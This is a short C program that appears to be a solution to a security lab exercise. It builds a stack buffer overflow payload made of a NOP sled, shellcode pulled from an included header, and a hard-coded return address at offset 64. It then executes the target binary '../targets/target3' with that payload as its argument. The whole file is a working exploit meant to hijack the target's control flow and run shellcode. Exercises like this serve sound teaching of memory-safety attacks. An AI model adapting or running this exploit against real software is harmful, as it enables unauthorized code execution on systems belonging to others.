#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
#define NOP 0x90
#define BUFFER_SIZE 80
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	char attack_buffer[BUFFER_SIZE];
	
	int i;
	for (i = 0; i < BUFFER_SIZE; i++)
	{
		attack_buffer[i] = NOP;
	}
	
	char *ptr = attack_buffer + 5;
	
	for (i = 0; i < strlen(shellcode); i++)
        {
                ptr[i] = shellcode[i];
        }
        
        *(int *) & attack_buffer[64] = 0x40a4fe10;
        attack_buffer[68] = '\x00';
        
	args[0] = TARGET;
	args[1] = attack_buffer;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}